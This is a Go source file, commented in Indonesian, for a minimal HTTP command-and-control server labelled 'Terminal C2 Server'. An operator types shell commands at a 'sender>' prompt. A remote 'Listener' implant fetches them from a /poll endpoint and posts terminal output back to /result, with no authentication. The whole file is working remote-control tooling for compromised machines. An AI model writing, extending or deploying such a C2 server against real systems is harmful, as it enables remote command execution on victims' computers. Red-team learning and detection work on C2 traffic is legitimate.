package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
)

var (
	currentCommand string
	commandMutex   sync.Mutex
	resultChan     = make(chan string)
)

// Endpoint untuk Listener mengambil perintah
func pollHandler(w http.ResponseWriter, r *http.Request) {
	commandMutex.Lock()
	defer commandMutex.Unlock()
	
	if currentCommand != "" {
		fmt.Fprint(w, currentCommand)
		currentCommand = "" // Hapus perintah setelah diambil Listener
	}
}

// Endpoint untuk Listener mengirimkan output terminal
func resultHandler(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	resultChan <- string(body)
}

func printBanner() {
	banner := `
  ____                 _           
 / ___|  ___ _ __   __| | ___ _ __ 
 \___ \ / _ \ '_ \ / _` + "`" + ` |/ _ \ '__|
  ___) |  __/ | | | (_| |  __/ |   
 |____/ \___|_| |_|\__,_|\___|_|   
 [Terminal C2 Server - Active]
-----------------------------------`
	fmt.Println("\033[32m" + banner + "\033[0m") // Warna hijau khas Matrix/Terminal
}

func main() {
	// Setup Routing HTTP
	http.HandleFunc("/poll", pollHandler)
	http.HandleFunc("/result", resultHandler)

	// Jalankan server di background
	go func() {
		if err := http.ListenAndServe(":8080", nil); err != nil {
			fmt.Println("[!] Gagal memulai server:", err)
			os.Exit(1)
		}
	}()

	printBanner()
	fmt.Println("[*] Listening on http://localhost:8080")
	fmt.Println("[*] Siap menerima koneksi dari Listener...")

	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Print("\033[31msender>\033[0m ") // Prompt merah
		if !scanner.Scan() {
			break
		}

		cmd := scanner.Text()
		if strings.TrimSpace(cmd) == "" {
			continue
		}

		// Masukkan perintah ke antrean
		commandMutex.Lock()
		currentCommand = cmd
		commandMutex.Unlock()

		// Tunggu hasil dari Listener
		res := <-resultChan
		fmt.Printf("\n\033[36m[Output]\033[0m\n%s\n", res)
	}
}
